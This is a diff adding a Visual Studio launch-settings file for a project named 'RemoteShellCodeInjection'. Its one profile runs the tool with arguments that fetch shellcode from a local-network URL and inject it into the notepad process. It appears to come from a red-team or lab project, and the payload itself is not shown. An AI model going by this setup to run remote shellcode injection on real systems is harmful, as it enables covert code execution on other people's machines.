@@ -1,0 +1,8 @@
+{
+  "profiles": {
+    "RemoteShellCodeInjection": {
+      "commandName": "Project",
+      "commandLineArgs": "-url http://192.168.239.128:8000/shellcode.txt -pname notepad"
+    }
+  }
+}
